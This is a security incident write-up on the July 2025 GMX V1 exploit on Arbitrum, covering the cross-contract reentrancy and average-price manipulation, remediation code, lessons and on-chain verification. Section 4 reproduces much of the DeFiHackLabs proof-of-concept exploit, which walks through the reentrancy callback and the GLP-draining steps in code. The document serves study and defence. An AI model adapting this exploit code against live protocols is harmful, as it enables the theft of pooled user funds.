# GMX — Unvalidated User Input Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-07-09 |
| **Protocol** | GMX V1 |
| **Chain** | Arbitrum |
| **Loss** | $41,003,649 (WETH, WBTC, USDC, USDe, LINK, UNI, USDT, FRAX, DAI) |
| **Attacker** | [0xDF33...5221](https://arbiscan.io/address/0xDF3340A436c27655bA62F8281565C9925C3a5221) |
| **Attack Contract** | [0x7D3B...355](https://arbiscan.io/address/0x7D3BD50336f64b7A473C51f54e7f0Bd6771cc355) |
| **Attack Tx** | [0x0318...6ef](https://arbiscan.io/tx/0x03182d3f0956a91c4e4c8f225bbc7975f9434fab042228c7acdc5ec9a32626ef) |
| **Vulnerable Contracts** | [OrderBook 0x09f7...ACB](https://arbiscan.io/address/0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB) / [Vault 0x489e...C4A](https://arbiscan.io/address/0x489ee077994B6658eAfA855C308275EAd8097C4A) |
| **Root Cause** | Cross-contract reentrancy via unvalidated user input — ETH refund callback recipient address not validated |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/gmx_exp.sol) |

---

## 1. Vulnerability Overview

GMX V1 is a decentralized perpetual futures trading protocol operating on Arbitrum, built on a GLP liquidity pool system. On July 9, 2025, an attacker combined two vulnerabilities to drain approximately $41M in assets.

### Core Vulnerability Combination

**Vulnerability 1 — Unvalidated Callback Recipient (Cross-Contract Reentrancy)**
The `OrderBook.createDecreaseOrder()` function allows users to freely specify a `_receiver` address for ETH refunds when decreasing a position. Because no validation is performed to determine whether the address is an EOA (Externally Owned Account) or a contract, the `fallback()` function of a malicious contract can be invoked. By calling `Vault.increasePosition()` directly from within this callback, the attacker was able to bypass the access controls and `ShortsTracker` updates enforced by `PositionRouter` and `PositionManager`.

**Vulnerability 2 — globalShortAveragePrice Update Inconsistency**
When `Vault.increasePosition()` is called directly, bypassing `PositionManager`, `ShortsTracker.updateGlobalShortData()` is never executed. As a result, `globalShortSizes` (position size) increases immediately while `globalShortAveragePrices` (average entry price) remains unchanged, creating a significant divergence.

**Outcome — AUM Manipulation and GLP Price Inflation**
The `GlpManager.getAum()` function uses the difference between `globalShortSizes` and `globalShortAveragePrices` to calculate unrealized losses. In the manipulated state, the average price of the BTC short position was distorted to approximately 1/57th of the actual market price ($1,914 vs. $109,515), causing the protocol to appear to hold enormous unrealized losses and inflating AUM abnormally. The attacker then minted GLP and redeemed it at the inflated price to drain real assets from the Vault.

---

## 2. Vulnerable Code Analysis

### 2.1 OrderBook.createDecreaseOrder() — Unvalidated Callback Recipient (Core Vulnerability)

```solidity
// ❌ Vulnerable code — ETH sent to _account without validating whether it is a contract
function executeDecreaseOrder(
    address _account,    // ❌ No validation that _account is an EOA
    uint256 _orderIndex,
    address payable _feeReceiver
) external onlyOrderKeeper {
    Order memory order = decreaseOrders[_account][_orderIndex];
    // ...position decrease logic executes...

    // ❌ Uses call with no gas limit for ETH refund → allows fallback() execution
    // ❌ ShortsTracker update is not yet complete at this point
    (bool success, ) = _account.call{value: order.executionFee}("");
    // ↑ This call triggers the attacker's fallback(), causing reentrancy
}
```

```solidity
// ✅ Fixed code — adds EOA validation or uses transfer
function executeDecreaseOrder(
    address _account,
    uint256 _orderIndex,
    address payable _feeReceiver
) external onlyOrderKeeper {
    // ✅ Reject execution if _account is a contract address
    require(_account.code.length == 0, "OrderBook: account must be EOA");
    // Alternatively: propagate reentrancy guard to the Vault level
    // Alternatively: execute ETH transfer after all state updates (CEI pattern)
    Order memory order = decreaseOrders[_account][_orderIndex];
    // ... remaining logic ...
}
```

**Issue**: `executeDecreaseOrder` implicitly assumes `_account` is always an EOA, but does not prevent the caller of `createDecreaseOrder` from being a contract. Since `globalShortAveragePrices` in the Vault has not yet been updated at the time ETH is refunded, calling `increasePosition` from within this callback records the inconsistent state.

---

### 2.2 Vault.increasePosition() — ShortsTracker Update Skipped on Direct Call

```solidity
// ❌ Vulnerable code — skips ShortsTracker update when called directly
function increasePosition(
    address _account,
    address _collateralToken,
    address _indexToken,
    uint256 _sizeDelta,
    bool _isLong
) external override nonReentrant {
    _validate(isLeverageEnabled, 28);
    // ❌ Without going through PositionManager, the following does not execute:
    // ShortsTracker.updateGlobalShortData() is never called → only globalShortSizes increases
    // → globalShortSizes ↑, globalShortAveragePrices unchanged → divergence occurs
    _increasePosition(_account, _collateralToken, _indexToken, _sizeDelta, _isLong, price);
}
```

```solidity
// ✅ Fixed code — directly updates ShortsTracker inside increasePosition
function increasePosition(
    address _account,
    address _collateralToken,
    address _indexToken,
    uint256 _sizeDelta,
    bool _isLong
) external override nonReentrant {
    _validate(isLeverageEnabled, 28);
    // ✅ Always update ShortsTracker for short positions
    if (!_isLong) {
        uint256 markPrice = _isLong ? getMaxPrice(_indexToken) : getMinPrice(_indexToken);
        shortsTracker.updateGlobalShortData(
            _account, _collateralToken, _indexToken, _isLong, _sizeDelta, markPrice, true
        );
    }
    _increasePosition(_account, _collateralToken, _indexToken, _sizeDelta, _isLong, price);
}
```

**Issue**: The `nonReentrant` guard only prevents reentrancy within the same contract. It does not block **cross-contract reentrancy**, where the attacker's `fallback()` calls a different contract (`Vault.increasePosition`). Furthermore, calling `Vault.increasePosition` directly while bypassing `PositionManager` means `ShortsTracker` synchronization never occurs.

---

### 2.3 GlpManager.getAum() — Consumes Manipulated globalShortAveragePrice

```solidity
// ❌ Vulnerable code — trusts the manipulated globalShortAveragePrices
function getGlobalShortDelta(address _token) public view returns (bool, uint256) {
    uint256 size = vault.globalShortSizes(_token);        // Updated immediately ↑
    uint256 averagePrice = getGlobalShortAveragePrice(_token); // ❌ Not updated — holds low value
    
    // ❌ size is large, averagePrice is low, so price > averagePrice → enormous unrealized loss calculated
    uint256 priceDelta = averagePrice > price ? averagePrice.sub(price) : price.sub(averagePrice);
    uint256 delta = size.mul(priceDelta).div(averagePrice);
    bool hasProfit = averagePrice > price;
    return (hasProfit, delta);
    // ↑ hasProfit=false, delta=astronomical number → added to AUM → GLP price skyrockets
}
```

**Issue**: With `globalShortAveragePrice` distorted to $1,914, the difference from the actual BTC price of $109,515 is approximately 57×, causing GlobalShortLoss to increase hundreds of times over and inflating AUM abnormally.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys malicious contract (implements `fallback()` and `gmxPositionCallback()`)
- Holds 3,001 USDC and 2 ETH
- Executes `router.approvePlugin(orderBook)` and `router.approvePlugin(positionRouter)`
- Attack block: Arbitrum #355878385 (ETH price $2,652.39)

### 3.2 Execution Phase

**Phase 1 — globalShortAveragePrice Manipulation**

```
Repeat 2 times:
  createOpenETHPosition()     → Create ETH long position increase order in OrderBook
  keeperExecuteOpenETHPosition() → PositionManager executes the order
```

```
createCloseETHPosition()      → Create ETH long position decrease order
                                 (receiver: the malicious contract itself)

Repeat 5 times:
  keeperExecuteCloseETHPosition()
    → PositionManager.executeDecreaseOrder() called
    → ETH refund triggers malicious contract's fallback() ← [REENTRANCY OCCURS]
    → Inside fallback():
        Vault.increasePosition(this, USDC, BTC, 90030e33, false)
          → globalShortSizes increases without ShortsTracker update
          → globalShortAveragePrice: $109,515 → (gradually decreasing) → $1,914
        positionRouter.createDecreasePosition(BTC short decrease request)
        createCloseETHPosition() re-called → prepares for next iteration

  keeperExecuteCloseBTCPosition()
    → FastPriceFeed.setPricesWithBitsAndExecute() called
    → BTC short position decrease executed
    → ShortsTracker normal update continues to drive globalShortAveragePrice down
```

**Phase 2 — Profit Realization (profitAttack)**

```
Set isProfit = true, then call final keeperExecuteCloseETHPosition()
  → fallback() executes profitAttack():
      Flash loan: obtain 7,538,567 USDC
      mintAndStakeGlp(USDC, 6,000,000) → mint 4,129,000 GLP
      increasePosition(USDC, BTC, 15,385e33, false) → large BTC short
      getProfitFor*(WETH/WBTC/USDC/USDe/LINK/UNI/USDT/FRAX/DAI):
        For each token: poolAmounts - reservedAmounts = drainable balance
        Call unstakeAndRedeemGlp() at inflated GLP price
      Repeat 10 times:
        mintAndStakeGlp(FRAX) + increasePosition + getProfitForFRAX
        + decreasePosition
      Flash loan repayment: return 7,538,567 USDC
```

### 3.3 Attack Flow Diagram

```
Attacker EOA
    │
    ▼
┌───────────────────────────────┐
│  Deploy Malicious Contract    │
│  (implements fallback +       │
│   gmxCallback)                │
└───────────────┬───────────────┘
                │ createDecreaseOrder(_receiver = malicious contract)
                ▼
┌───────────────────────────────┐
│  OrderBook                    │
│  createDecreaseOrder()        │
│  executeDecreaseOrder()       │
│  → ETH refund: call{value}() │◄── ❌ Recipient not validated
└───────────────┬───────────────┘
                │ ETH received → fallback() executes
                ▼
┌───────────────────────────────┐          ┌──────────────────────┐
│  Malicious Contract fallback()│          │  ShortsTracker       │
│  ① Vault.increasePosition()  │──────────►│  updateGlobal...()   │
│    (direct call, bypasses     │  ❌ Not   │  ← Never called!    │
│     Manager)                  │  called   └──────────────────────┘
│  ② createDecreasePosition()  │
└───────────────┬───────────────┘
                │ Bypasses PositionManager → ShortsTracker not updated
                ▼
┌───────────────────────────────┐
│  Vault (inconsistent state)   │
│  globalShortSizes ↑↑↑        │
│  globalShortAveragePrice      │
│  unchanged                    │
│  → $109,515 → $1,914 (57×↓) │
└───────────────┬───────────────┘
                │ Manipulation complete after 5 iterations
                ▼
┌───────────────────────────────┐
│  GlpManager.getAum()          │
│  GlobalShortLoss = abnormally │
│  inflated                     │
│  AUM ↑↑↑ → GLP price ↑↑↑   │
└───────────────┬───────────────┘
                │ Redeem at inflated GLP price
                ▼
┌───────────────────────────────┐
│  RewardRouterV2               │
│  unstakeAndRedeemGlp()        │
│  (drain WETH/BTC/USDC/USDe/  │
│   LINK/UNI/USDT/FRAX/DAI)    │
└───────────────┬───────────────┘
                │
                ▼
        Loss: ~$41,003,649
```

### 3.4 Outcome

- **Attacker Profit**: Approximately $41,003,649 (net profit after repaying 7.5M USDC flash loan)
- **Protocol Loss**: Across WETH, WBTC, USDC, USDe, LINK, UNI, USDT, FRAX, DAI
- **GMX Response**: Immediately suspended GLP trading, minting, and redemption on Arbitrum and Avalanche
- **Final Resolution**: Attacker accepted a $5M whitehat bounty and returned all remaining funds

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/gmx_exp.sol
// Attack block: Arbitrum #355878385 (ETH price $2,652.39)

pragma solidity ^0.8.22;

contract ContractTest is Test {

    // ========================
    // [Step 1] Test environment setup
    // ========================
    function setUp() public {
        vm.createSelectFork("arbitrum", 355878385 - 1);
        deal(address(usdc_), address(this), 3001000000); // 3,001 USDC
        vm.deal(address(this), 2 ether);
        router_.approvePlugin(address(orderBook_));      // Approve OrderBook plugin
        router_.approvePlugin(address(positionRouter_)); // Approve PositionRouter plugin
    }

    // ================================
    // [Step 2] Main attack flow
    // ================================
    function testExploit() public {
        // 2 iterations: open ETH long positions (prepare for globalShortAveragePrice manipulation)
        for (uint256 i = 0; i < 2; i++) {
            createOpenETHPosition();
            keeperExecuteOpenETHPosition();
        }

        // Create ETH position decrease order → prepare for fallback() reentrancy
        createCloseETHPosition();

        // 5 iterations: manipulate globalShortAveragePrice via fallback() reentrancy
        for(uint i = 0; i < 5; i++) {
            keeperExecuteCloseETHPosition(); // ← reentrancy entry point
            keeperExecuteCloseBTCPosition(); // ← partial ShortsTracker update
        }
        // BTC globalShortAveragePrice: $109,515 → $1,914 (approx. 57× distortion)

        // Final attack: realize profit at inflated GLP price
        isProfit = true;
        keeperExecuteCloseETHPosition(); // fallback() → calls profitAttack()
    }

    // ================================
    // [Step 3] Reentrancy trigger point
    // ================================
    fallback() external payable {
        if(isProfit) {
            profitAttack(); // Final asset drain
        } else {
            // ❌ Core: directly calls Vault.increasePosition bypassing PositionManager
            // → ShortsTracker.updateGlobalShortData() does not execute
            // → globalShortSizes ↑, globalShortAveragePrice unchanged
            usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));
            vault_.increasePosition(
                address(this),
                address(usdc_),
                address(btc_),
                90030000000000000000000000000000000, // ~$90,030,000 BTC short position
                false // isLong = false (short position)
            );
            // Create BTC short decrease request for next iteration
            positionRouter_.createDecreasePosition{value: 3000000000000000}(
                path, address(btc_), 0,
                90030000000000000000000000000000000,
                false, address(this), 120e33, 0, 3e15, false, address(this)
            );
        }
    }

    // ================================
    // [Step 4] Profit realization function
    // ================================
    function profitAttack() public {
        // Flash loan: obtain 7,538,567 USDC
        deal(address(usdc_), address(this), 7_538_567_619570);

        // Mint GLP (while AUM is inflated)
        uint256 glpAmount = rewardRouterV2_.mintAndStakeGlp(address(usdc_), 6000000000000, 0, 0);

        // Further AUM manipulation via large BTC short position
        usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));
        vault_.increasePosition(address(this), address(usdc_), address(btc_),
            15385676195700000000000000000000000000, false);

        // Drain all 9 tokens: redeem full poolAmounts - reservedAmounts for each
        getProfitForETH(); getProfitForBTC();  getProfitForUSDC();
        getProfitForUSDE(); getProfitForLINK(); getProfitForUNI();
        getProfitForUSDT(); getProfitForFRAX(); getProfitForDAI();

        // 10 additional iterations to drain more FRAX
        for(uint i = 0; i < 10; i++) {
            rewardRouterV2_.mintAndStakeGlp(address(frax_), 9000000000000000000000000, 0, 0);
            usdc_.transfer(address(vault_), 500000000000);
            vault_.increasePosition(address(this), address(usdc_), address(btc_),
                12500000000000000000000000000000000000, false);
            getProfitForFRAX();
            vault_.decreasePosition(address(this), address(usdc_), address(btc_),
                0, 12500000000000000000000000000000000000, false, address(this));
        }
        getProfitForUSDC();
        usdc_.transfer(address(0x1), 7_538_567_619570); // Flash loan repayment
    }

    // getProfitFor*(): Per-token drain logic (WETH/BTC/USDC/USDe/LINK/UNI/USDT/FRAX/DAI)
    // poolAmounts - reservedAmounts = drainable balance, converted to GLP then unstakeAndRedeemGlp()
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Unvalidated User Input — Callback Recipient Address | CRITICAL | CWE-20 |
| V-02 | Cross-Contract Reentrancy | CRITICAL | CWE-841 |
| V-03 | Price Data Inconsistency (globalShortAveragePrice) | HIGH | CWE-362 |
| V-04 | Access Control Bypass (PositionManager Bypass) | HIGH | CWE-284 |

---

### V-01: Unvalidated User Input — Callback Recipient Address

- **Description**: `OrderBook.createDecreaseOrder()` allows users to freely specify the recipient address for ETH refunds when decreasing a position. Because no validation is performed to determine whether the address is a contract or an EOA, execution of a malicious contract's `fallback()` function is permitted.
- **Impact**: The attacker can execute additional transactions from within the ETH receive callback at a point when the Vault state is inconsistent. This ultimately enables large-scale asset drainage via GLP price inflation.
- **Attack Conditions**: (1) Ability to call `createDecreaseOrder()` from a malicious contract, (2) minimal initial capital (~3,001 USDC + 2 ETH)

---

### V-02: Cross-Contract Reentrancy

- **Description**: The `nonReentrant` guard on `OrderBook.executeDecreaseOrder()` only prevents reentrancy within the same contract. It does not block cross-contract reentrancy, where the malicious contract's `fallback()` calls an external contract (`Vault`) after receiving ETH.
- **Impact**: The inconsistent state between `Vault.globalShortSizes` and `ShortsTracker.globalShortAveragePrices` is permanently committed, corrupting AUM calculations.
- **Attack Conditions**: Registration of a contract capable of reentrancy during execution of `executeDecreaseOrder()` when ETH refund occurs

---

### V-03: Price Data Inconsistency — globalShortAveragePrice Not Updated

- **Description**: When `Vault.increasePosition()` is called directly, bypassing `PositionManager`, `ShortsTracker.updateGlobalShortData()` is never executed. This creates a large divergence between `globalShortSizes` (updated immediately) and `globalShortAveragePrices` (not updated).
- **Impact**: The average price of the BTC short position falls approximately 57× from $109,515 to $1,914, causing `getAum()` to calculate hundreds of times the actual unrealized loss.
- **Attack Conditions**: Direct access to Vault (with `isLeverageEnabled = true`)

---

### V-04: Access Control Bypass — PositionManager Routing Not Enforced

- **Description**: `Vault.increasePosition()` only performs an `isLeverageEnabled` check and does not validate whether the caller is `PositionManager` or `PositionRouter`. A malicious contract can therefore call this function directly, bypassing the safe execution path.
- **Impact**: All risk checks and state synchronization logic that should occur during position creation are skipped entirely.
- **Attack Conditions**: Direct access to Vault with `isLeverageEnabled` active

---

## 6. Remediation Recommendations

### Immediate Actions

**[Fix 1] Add EOA Validation (OrderBook)**

```solidity
// Apply to OrderBook.executeDecreaseOrder()
function executeDecreaseOrder(
    address _account,
    uint256 _orderIndex,
    address payable _feeReceiver
) external onlyOrderKeeper {
    // ✅ Reject execution if _account is a contract
    require(
        _account.code.length == 0,
        "OrderBook: receiver must be EOA"
    );
    // ... existing logic ...
}
```

**[Fix 2] Apply CEI Pattern (Check-Effects-Interactions)**

```solidity
// Transfer ETH only after all state changes are complete
function executeDecreaseOrder(...) external onlyOrderKeeper {
    // [Check] Validate order existence
    // [Effects] State changes (position decrease, including ShortsTracker update)
    _updateShortsTracker(...); // ✅ Execute before ETH transfer
    delete decreaseOrders[_account][_orderIndex];
    // [Interactions] ETH transfer last
    (bool success, ) = _account.call{value: fee}("");
}
```

**[Fix 3] Vault.increasePosition() — Restrict Callers**

```solidity
// ✅ Restrict increasePosition callers to approved contracts
function increasePosition(...) external override nonReentrant {
    require(
        msg.sender == positionManager || msg.sender == positionRouter,
        "Vault: invalid caller"
    );
    // ... existing logic ...
}
```

**[Fix 4] Enforce ShortsTracker Update Internally in Vault**

```solidity
// Integrate directly into Vault._increasePosition()
function _increasePosition(...) internal {
    // ... position increase logic ...
    if (!_isLong) {
        // ✅ Always synchronize ShortsTracker for short positions
        IShortsTracker(shortsTracker).updateGlobalShortData(
            _account, _collateralToken, _indexToken,
            _isLong, _sizeDelta, price, true
        );
    }
}
```

---

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 (Unvalidated Recipient) | Add `code.length == 0` check for all externally specified target addresses |
| V-02 (Cross-Contract Reentrancy) | Apply global reentrancy guard at the Vault level; move ETH transfers after all state updates |
| V-03 (Price Data Inconsistency) | Integrate ShortsTracker updates into Vault internal logic to eliminate reliance on external call paths |
| V-04 (Access Control Bypass) | Apply `onlyPositionRouter` / `onlyPositionManager` modifiers to dangerous Vault functions |
| General Design | Redesign architecture to atomically guarantee state synchronization between adjacent contracts within a single transaction |

---

## 7. Lessons Learned

1. **Always validate ETH/native token transfer recipients**: A `_receiver` or `_account` address specified by the user may be a contract. Add `address.code.length == 0` validation for refund target addresses, or use the Withdrawal Pattern instead of direct ETH transfers.

2. **`nonReentrant` guards do not prevent cross-contract reentrancy**: A reentrancy guard on a single contract does not propagate to other contracts. In complex protocols, apply a global reentrancy guard directly to core contracts such as the Vault, or strictly adhere to the CEI (Check-Effects-Interactions) pattern.

3. **State updates across contracts sharing state must be atomic**: Linked state variables such as `Vault.globalShortSizes` and `ShortsTracker.globalShortAveragePrices` must always be updated together within the same transaction. Any code path that updates only one side becomes a manipulation vector.

4. **Strengthen access controls to prevent external contracts from directly accessing critical functions**: Functions that directly modify protocol state, such as `Vault.increasePosition()`, must only be callable by approved contracts (`PositionManager`, `PositionRouter`). A simple `isLeverageEnabled` flag is insufficient.

5. **Audit for security regressions introduced by design changes**: This vulnerability was introduced during a fix for a separate vulnerability in 2022. Every code modification must be accompanied by a review to confirm that related security assumptions remain valid.

6. **AUM/price calculations in multi-contract systems should use a Single Source of Truth**: When price or size information is distributed across multiple contracts, design the system so only the latest synchronized state is ever referenced.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Key Data Comparison

| Field | PoC Value | On-Chain Confirmed Value |
|------|--------|-------------|
| Attack Block | 355878385 | Arbitrum #355878385 |
| ETH Price (at attack) | $2,652.39 | $2,652.39 |
| BTC globalShortAvgPrice (pre-manipulation) | ~$109,515 | $109,515.05 |
| BTC globalShortAvgPrice (post-manipulation) | ~$1,914 | $1,913.705 |
| Flash Loan Amount | 7,538,567 USDC | 7,538,567.619570 USDC |
| GLP Minted | 4,129,000 GLP (estimated) | ~4,129,000 GLP |
| Total Loss | ~$41M | $41,003,649 |
| Final Attack Tx | `0x03182d...6ef` | Confirmed on Arbiscan |

### 8.2 Key Transaction References

| Step | Transaction |
|------|---------|
| ETH position decrease order creation | [0x20ab...49af](https://arbiscan.io/tx/0x20abfeff0206030986b05422080dc9e81dbb53a662fbc82461a47418decc49af) |
| Reentrancy execution (repeated) | [0x1f00...353](https://arbiscan.io/tx/0x1f00da742318ad1807b6ea8283bfe22b4a8ab0bc98fe428fbfe443746a4a7353) |
| BTC position decrease execution | [0x222c...64e](https://arbiscan.io/tx/0x222cdae82a8d28e53a2bddfb34ae5d1d823c94c53f8a7abc179d47a2c994464e) |
| Final profit realization | [0x0318...6ef](https://arbiscan.io/tx/0x03182d3f0956a91c4e4c8f225bbc7975f9434fab042228c7acdc5ec9a32626ef) |

### 8.3 Precondition Verification

- **Attacker Initial Capital**: 3,001 USDC + 2 ETH (started with minimal funds)
- **State Immediately Before Attack Block**: `isLeverageEnabled = true`, Vault holding large liquidity reserves
- **Profitability Condition**: BTC globalShortAveragePrice must be manipulated to below 1/57 of actual market price
- **Post-Attack Handling**: Attacker accepted a $5M whitehat bounty and returned the full remaining balance

---

*Analysis completed — 2026-04-11*
*PoC Reference: [DeFiHackLabs/src/test/2025-07/gmx_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/gmx_exp.sol)*